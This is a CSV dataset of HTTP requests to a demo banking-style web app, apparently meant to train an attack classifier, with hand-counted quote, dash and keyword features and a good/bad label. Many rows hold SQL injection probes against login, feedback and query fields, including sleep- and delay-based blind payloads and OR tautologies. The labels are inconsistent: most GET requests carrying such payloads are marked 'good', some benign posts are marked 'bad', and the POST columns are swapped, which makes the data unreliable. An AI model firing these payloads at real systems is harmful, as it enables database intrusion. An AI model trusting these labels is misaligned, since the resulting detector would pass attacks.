method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_about.htm,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
POST,"%F0''%F0""""&passw=g00dPa%24%24w0rD&uid=e",/doLogin,4,4,0,0,0,2,bad
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=JyI=,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm&job=-1%20OR%202%2B747-747-1=0%2B0%2B0%2B1,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=0'XOR(if(now()=sysdate()%2Csleep(14)%2C0))XOR'Z&job=MortgageLendingAccountExecutive:Sales,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=verCkNz6';%20waitfor%20delay%20'0:0:6'%20--%20&subject=1,/sendFeedback,6,0,2,0,7,4,bad
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm?url=-1'%20OR%202%2B401-401-1=0%2B0%2B0%2B1%20--%20,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/disclaimer.htm?url=JyI=,0,0,0,0,0,0,good
GET,,/index.jsp?content=-1%20OR%202%2B206-206-1=0%2B0%2B0%2B1%20--%20&job=CustomerServiceRepresentative:CustomerService,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_benefits.htm,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,1%20waitfor%20delay%20'0:0:13'%20--%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,4,0,2,0,5,4,bad
GET,,/swagger,0,0,0,0,0,0,good
POST,gOjFEu8A';select%20pg_sleep(34.974);%20--%20&passw=g00dPa%24%24w0rD&uid=1,/doLogin,2,0,2,2,3,6,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=Careers&template=US,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,"/index.jsp?content=%F0''%F0""""&job=CustomerServiceRepresentative:CustomerService",0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,"/index.jsp?content=%BF'%BF""&job=OperationalRiskManager:RiskManagement",0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/search.jsp?query=-1%20OR%203*2>(0%2B5%2B785-785)%20--%20,0,0,0,0,0,0,good
GET,,/survey_questions.jsp?step=a,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp?content=-1%20OR%203%2B206-206-1=0%2B0%2B0%2B1%20--%20&job=CustomerServiceRepresentative:CustomerService,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=-1%20OR%202%2B830-830-1=0%2B0%2B0%2B1&job=LoyaltyMarketingProgramManager:Marketing,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Subscribe&txtEmail=sample%40email.tst,/doSubscribe,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=%BF'%BF""&name=zFPWdwPk&subject=1",/sendFeedback,2,2,0,0,2,0,bad
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/search.jsp?query=%5C,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=%5C&job=OperationalRiskManager:RiskManagement,0,0,0,0,0,0,good
GET,,/survey_questions.jsp?step=g7OnIWzQ,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=Careers&template=%5C,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm&job=hUEfHuiL');select%20pg_sleep(10);%20--%20,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1%00%C0%A7%C0%A2%252527%252522,/sendFeedback,0,0,0,0,2,0,bad
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
POST,1%20waitfor%20delay%20'0:0:6'%20--%20&txtEmail=sample%40email.tst,/doSubscribe,4,0,2,0,5,4,bad
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/index.jsp?content=personal_investments.htm,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Subscribe&txtEmail=%40%40Gpeg0,/doSubscribe,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,2,0,bad
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp?content=d5XylshE';select%20pg_sleep(6);%20--%20&job=LoyaltyMarketingProgramManager:Marketing,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=if(now()=sysdate()%2Csleep(7)%2C0)&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,8,2,2,bad
GET,,/util,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/index.jsp?content=-1%20OR%203%2B95-95-1=0%2B0%2B0%2B1%20--%20,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_careers.htm,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=-1%20OR%202%2B59-59-1=0%2B0%2B0%2B1%20--%20,/sendFeedback,0,0,2,0,6,0,bad
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm'%20AND%202*3*8=6*8%20AND%20'ItiV'='ItiV&job=CustomerServiceRepresentative:CustomerService,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
POST,"%F0''%F0""""&txtEmail=sample%40email.tst",/doSubscribe,4,4,0,0,0,0,bad
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp?content=-1%20OR%202%2B316-316-1=0%2B0%2B0%2B1%20--%20&job=OperationalRiskManager:RiskManagement,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=%BF'%BF""",/sendFeedback,2,2,0,0,2,0,bad
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp?content=l7joQ8nK&job=MortgageLendingAccountExecutive:Sales,0,0,0,0,0,0,good
GET,,/swagger/swagger-ui-standalone-preset.js,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm%25'%20AND%202*3*8=6*8%20AND%20'fjPA'!='fjPA%25&job=Teller:ConsumaerBanking,0,0,0,0,0,0,good
POST,%40%40t7dEh&txtEmail=sample%40email.tst,/doSubscribe,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=1%20waitfor%20delay%20'0:0:3'%20--%20&template=US,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp?HostName=-1'%20OR%202%2B851-851-1=0%2B0%2B0%2B1%20--%20,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=%5C,0,0,0,0,0,0,good
GET,,/,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=Careers&template=0'XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR'Z,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%203*2=6%20AND%20000623=000623%20or%20'bkqL7jUZ'='&uid=e,/doLogin,8,0,0,0,6,2,bad
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=-1;%20waitfor%20delay%20'0:0:3'%20--%20,/sendFeedback,4,0,2,0,7,4,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=if(now()=sysdate()%2Csleep(14)%2C0)&job=MortgageLendingAccountExecutive:Sales,0,0,0,0,0,0,good
GET,,/survey_questions.jsp?step=%5C,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
POST,0'XOR(if(now()=sysdate()%2Csleep(23.316)%2C0))XOR'Z&passw=g00dPa%24%24w0rD&uid=1,/doLogin,4,0,0,10,0,4,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%203*2=5%20AND%2023=23%20or%20'pfTIODsN'='&uid=e,/doLogin,8,0,0,0,6,2,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm&job=Xf7TP2d3,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
POST,Mj5H4BTl&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,"/Privacypolicy.jsp?sec=0""XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR""Z&template=US",0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_press.htm,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=%BF'%BF""&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1",/sendFeedback,2,2,0,0,2,0,bad
POST,submit=%20Submit%20&cfile=1%20waitfor%20delay%20'0:0:7'%20--%20&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,4,0,2,0,7,4,bad
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=if(now()=sysdate()%2Csleep(6)%2C0)&subject=1,/sendFeedback,0,0,0,8,2,2,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=Careers&template=-1'%20OR%202%2B874-874-1=0%2B0%2B0%2B1%20or%20'27lwzvrb'=',0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/my%20documents/JohnSmith,0,0,0,0,0,0,good
POST,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1'""",/doLogin,2,2,0,0,0,2,bad
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=-1);select%20pg_sleep(3);%20--%20,/sendFeedback,0,0,2,2,5,4,bad
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/search.jsp?query=1%00%C0%A7%C0%A2%252527%252522,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp?content=ELn7Eqzl&job=Teller:ConsumaerBanking,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp?HostName=JyI=,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1'""&subject=1",/sendFeedback,2,2,0,0,2,0,bad
GET,,/index.jsp?content=JyI=&job=ExecutiveAssistant:Administration,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
POST,aR6CVQtw');select%20pg_sleep(44.43);%20--%20&passw=g00dPa%24%24w0rD&uid=e,/doLogin,2,0,2,2,3,6,bad
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp?content=-1%20OR%203%2B116-116-1=0%2B0%2B0%2B1%20--%20&job=ExecutiveAssistant:Administration,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,"/Privacypolicy.jsp?sec=-1""%20OR%202%2B762-762-1=0%2B0%2B0%2B1%20--%20&template=US",0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/disclaimer.htm?url=1%00%C0%A7%C0%A2%252527%252522,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=Careers&template=0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=-1);select%20pg_sleep(9);%20--%20&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,2,2,5,4,bad
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=JyI=&uid=e,/doLogin,0,0,0,0,0,2,bad
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/disclaimer.htm?url=-1%20OR%202%2B117-117-1=0%2B0%2B0%2B1,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp?content=-1%20OR%202%2B95-95-1=0%2B0%2B0%2B1%20--%20,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,"/util/serverStatusCheckService.jsp?HostName=-1""%20OR%203%2B675-675-1=0%2B0%2B0%2B1%20--%20",0,0,0,0,0,0,good
POST,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%F0''%F0""""",/doLogin,4,4,0,0,0,2,bad
GET,,/search.jsp?query=-1%20OR%203*2>(0%2B5%2B646-646),0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=-1);%20waitfor%20delay%20'0:0:6'%20--%20,/sendFeedback,4,0,2,0,7,4,bad
POST,submit=%20Submit%20&cfile=comments.txt&comments=-1));select%20pg_sleep(6);%20--%20&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,2,2,5,4,bad
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=1%00%C0%A7%C0%A2%252527%252522&uid=e,/doLogin,0,0,0,0,0,2,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=LDD9rye5&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,2,0,bad
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/swagger/swagger-ui-bundle.js,0,0,0,0,0,0,good
GET,,"/index.jsp?content=%BF'%BF""&job=LoyaltyMarketingProgramManager:Marketing",0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=if(now()=sysdate()%2Csleep(3)%2C0)&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,8,2,2,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/favicon.ico,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%203*2>(0%2B5%2B27-27)%20or%20'kQWwwMxI'='&uid=1,/doLogin,8,0,0,2,4,2,bad
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=-1%20OR%203%2B449-449-1=0%2B0%2B0%2B1%20--%20&name=zFPWdwPk&subject=1,/sendFeedback,0,0,2,0,6,0,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp?step=a'%20AND%202*3*8=6*8%20AND%20'C79c'='C79c,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/pr/,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
